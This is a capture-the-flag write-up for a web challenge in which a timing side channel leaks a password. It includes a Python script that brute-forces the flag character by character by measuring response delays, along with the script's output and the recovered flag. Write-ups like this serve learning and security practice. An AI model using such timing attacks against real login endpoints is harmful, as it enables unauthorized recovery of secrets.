## Networked Password
### Category : Web

---

```
Storing passwords on my own server seemed unsafe, so I stored it on a seperate one instead. However, the connection between them is very slow and I have no idea why.

```

So, we are given a link, which asks for a password, and the real password apparently is stored somewhere on a separate server. As I first try to login, I try `password` as password, and obviously, I get a `Incorrect Password`. The Problem Statement, states the output as slow, but I received this pretty quickly. So, next I try to input `hsctf{}`, and this one took some sweet time. So, maybe the validation takes some time?

I write a small script to test out the times, and it turns out as near we get to the flag, the more time it takes. Exactly, 0.5 second more per flag.


To exploit this, I write a script

`exploit.py`
```
import requests
import time
import string

def timediff(flag):
    url = "https://networked-password.web.chal.hsctf.com/"
    data={"password":flag}
    a=time.time()
    r = requests.post(url,data=data)
    b=time.time()
    return (b-a)


charlist = string.printable

if __name__ == "__main__":
    flag="h"
    curr_time_diff=timediff(flag)
    while True:
        for i in charlist:
            timee = timediff(flag+i)
            if(timee-curr_time_diff>0.4):
                flag = flag+i
                print("=> {}".format(flag))
                curr_time_diff = timee
                break 
            else:
                print(flag+i,end="\r")
```

output

```
vipul@ubuntu:~/Noti-fyre$ python3 exploit.py                
=> hs
=> hsc
=> hsct
=> hsctf
=> hsctf{
=> hsctf{s
=> hsctf{sm
=> hsctf{sm0
=> hsctf{sm0l
=> hsctf{sm0l_
=> hsctf{sm0l_f
=> hsctf{sm0l_fl
=> hsctf{sm0l_fl4
=> hsctf{sm0l_fl4g
=> hsctf{sm0l_fl4g}

```
Luckily the flag was small enough to be found in some sane unit of time.